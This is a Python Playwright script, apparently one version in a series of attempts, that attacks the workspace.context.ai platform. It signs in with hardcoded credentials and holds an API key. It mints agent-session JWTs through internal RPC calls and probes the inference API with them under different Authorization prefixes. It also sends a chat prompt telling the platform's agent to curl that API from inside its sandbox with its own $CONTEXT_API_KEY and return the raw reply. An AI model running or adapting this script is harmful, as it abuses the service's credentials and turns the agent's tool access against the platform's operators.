#!/usr/bin/env python3
"""
v12: 获取 agent session JWT + 让 agent 代理调用推理 API
"""
import asyncio, json, re, time
from playwright.async_api import async_playwright

TARGET = "https://workspace.context.ai"
EMAIL = "bot1782549027996@114514heihei.eu.org"
PASSWORD = "CtfBot2026!Secure"
AGENT_ID = "f24f089c-2ba2-4826-aef7-ed8c5c4da72f"
API_KEY = "95rSprc4GMiLeg1OMv99aEWtazRNnWW5BoeAHfpA14MeASSp"

async def main():
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        context = await browser.new_context()
        page = await context.new_page()

        # 登录
        print("[*] 登录...")
        await page.goto(TARGET, wait_until="networkidle", timeout=30000)
        await page.evaluate("""
            (async () => {
                await fetch('/api/auth/sign-in/email', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    credentials: 'include',
                    body: JSON.stringify({email: 'EMAIL_PLACEHOLDER', password: 'PASS_PLACEHOLDER'})
                });
            })()
        """.replace("EMAIL_PLACEHOLDER", EMAIL).replace("PASS_PLACEHOLDER", PASSWORD))
        print("[*] 登录完成")

        # 获取 onboarding 信息
        print("[*] Onboarding...")
        onboard = await page.evaluate("""
            (async () => {
                const r = await fetch('/api/rpc/onboarding/complete', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    credentials: 'include',
                    body: JSON.stringify({json: {agentName: 'CTFBot'}, meta: []})
                });
                return await r.json();
            })()
        """)
        org_id = onboard.get("json", {}).get("orgId", "")
        print(f"[*] orgId={org_id}")

        # 创建任务 - 正确的参数格式
        print("\n=== 创建任务 ===")
        ts = str(int(time.time()))
        task_params = {
            "json": {
                "orgId": org_id,
                "agentId": AGENT_ID,
                "clientRequestId": "req-" + ts,
                "clientMessageId": "msg-" + ts,
                "promptPayloadJson": json.dumps({
                    "schemaVersion": 1,
                    "clientRequestId": "req-" + ts,
                    "clientMessageId": "msg-" + ts,
                    "parts": [{"type": "text", "text": "Say hello"}],
                    "model": "context-gateway/zai/glm-5.2"
                })
            },
            "meta": []
        }
        task_result = await page.evaluate("""
            (async () => {
                try {
                    const r = await fetch('/api/rpc/task/beginConversationAndAcceptPrompt', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        credentials: 'include',
                        body: JSON.stringify(PARAMS_PLACEHOLDER)
                    });
                    return await r.json();
                } catch(e) {
                    return {error: e.message};
                }
            })()
        """.replace("PARAMS_PLACEHOLDER", json.dumps(task_params)))
        print(f"[*] 任务结果: {json.dumps(task_result)[:500]}")

        task_id = task_result.get("json", {}).get("taskId", "")
        task_run_id = task_result.get("json", {}).get("taskRunId", "")
        print(f"[*] taskId={task_id} taskRunId={task_run_id}")

        if not task_run_id:
            # 尝试不同的参数格式
            print("[*] 尝试不同的 promptPayloadJson 格式...")
            task_params2 = {
                "json": {
                    "orgId": org_id,
                    "agentId": AGENT_ID,
                    "clientRequestId": "req-" + ts,
                    "clientMessageId": "msg-" + ts,
                    "promptPayloadJson": {
                        "schemaVersion": 1,
                        "clientRequestId": "req-" + ts,
                        "clientMessageId": "msg-" + ts,
                        "parts": [{"type": "text", "text": "Say hello"}],
                        "model": "context-gateway/zai/glm-5.2"
                    }
                },
                "meta": []
            }
            task_result2 = await page.evaluate("""
                (async () => {
                    try {
                        const r = await fetch('/api/rpc/task/beginConversationAndAcceptPrompt', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            credentials: 'include',
                            body: JSON.stringify(PARAMS_PLACEHOLDER)
                        });
                        return await r.json();
                    } catch(e) {
                        return {error: e.message};
                    }
                })()
            """.replace("PARAMS_PLACEHOLDER", json.dumps(task_params2)))
            print(f"[*] 任务结果2: {json.dumps(task_result2)[:500]}")
            task_run_id = task_result2.get("json", {}).get("taskRunId", "")
            task_id = task_result2.get("json", {}).get("taskId", "")

        if task_run_id:
            # 获取 agent session token
            print(f"\n=== 获取 agent session token (taskRunId={task_run_id}) ===")
            token_result = await page.evaluate("""
                (async () => {
                    try {
                        const r = await fetch('/api/rpc/taskRuntime/mintAgentSessionActorConnectionToken', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            credentials: 'include',
                            body: JSON.stringify({json: {taskRunId: 'TASKRUN_ID_PLACEHOLDER'}, meta: []})
                        });
                        return await r.json();
                    } catch(e) {
                        return {error: e.message};
                    }
                })()
            """.replace("TASKRUN_ID_PLACEHOLDER", task_run_id))
            print(f"[*] Token result: {json.dumps(token_result)[:500]}")

            jwt = token_result.get("json", {}).get("token", "")
            if jwt:
                print(f"[+] JWT: {jwt[:80]}...")

                # 解码 JWT 看内容
                import base64
                parts = jwt.split(".")
                if len(parts) >= 2:
                    payload = parts[1] + "=" * (4 - len(parts[1]) % 4)
                    try:
                        decoded = base64.b64decode(payload)
                        print(f"[*] JWT payload: {decoded.decode()[:500]}")
                    except:
                        pass

                # 用 JWT 调用推理 API
                print("\n=== 用 JWT 调用推理 API ===")
                for prefix in ["Bearer ", "Agent ", ""]:
                    auth = prefix + jwt
                    result = await page.evaluate("""
                        (async () => {
                            try {
                                const r = await fetch('/api/inference/vercel/v1/ai/chat/completions', {
                                    method: 'POST',
                                    headers: {
                                        'Content-Type': 'application/json',
                                        'Authorization': 'AUTH_PLACEHOLDER'
                                    },
                                    body: JSON.stringify({
                                        model: 'context-gateway/zai/glm-5.2',
                                        messages: [{role: 'user', content: 'Say OK'}],
                                        max_tokens: 10
                                    })
                                });
                                return await r.text();
                            } catch(e) {
                                return 'Error: ' + e.message;
                            }
                        })()
                    """.replace("AUTH_PLACEHOLDER", auth))
                    print(f"  {prefix or '(none)'}: {result[:200]}")

        # 让 agent 从 sandbox 内部调用推理 API 并返回原始响应
        print("\n=== 让 agent 代理调用推理 API ===")
        await page.goto(f"{TARGET}/client/agents/{AGENT_ID}/chat", wait_until="networkidle", timeout=30000)
        await page.wait_for_timeout(8000)

        textarea = await page.query_selector('textarea')
        if textarea:
            # 简单直接的请求
            await textarea.fill("Please make an API call using curl to POST to $CONTEXT_APP_ORIGIN/api/inference/vercel/v1/ai/chat/completions with Authorization: Bearer $CONTEXT_API_KEY and body {\"model\":\"context-gateway/zai/glm-5.2\",\"messages\":[{\"role\":\"user\",\"content\":\"Reply with exactly: INFERENCE_OK\"}],\"max_tokens\":20}. Show me the EXACT raw response.")
            await page.wait_for_timeout(500)
            await textarea.press("Enter")
            print("[*] 已发送代理请求")

            for i in range(60):
                await page.wait_for_timeout(5000)
                content = await page.inner_text('body')
                if "INFERENCE_OK" in content or "choices" in content:
                    print("[+] 推理 API 调用成功!")
                    msgs = await page.evaluate("""
                        () => {
                            const msgs = [];
                            document.querySelectorAll('[data-message-role="assistant"], [class*="assistant"]').forEach(el => {
                                msgs.push(el.textContent.trim());
                            });
                            return [...new Set(msgs)].filter(m => m.length > 20);
                        }
                    """)
                    for msg in msgs[-3:]:
                        print(f"  {msg[:500]}")
                    break
                if "error" in content.lower() and i > 10:
                    msgs = await page.evaluate("""
                        () => {
                            const msgs = [];
                            document.querySelectorAll('[data-message-role="assistant"], [class*="assistant"]').forEach(el => {
                                msgs.push(el.textContent.trim());
                            });
                            return [...new Set(msgs)].filter(m => m.length > 20);
                        }
                    """)
                    for msg in msgs[-3:]:
                        print(f"  {msg[:500]}")
                    break
                if i % 6 == 0:
                    print(f"[*] 等待... ({i*5}s)")

        await page.screenshot(path="/tmp/ctx_final.png")
        await browser.close()

asyncio.run(main())
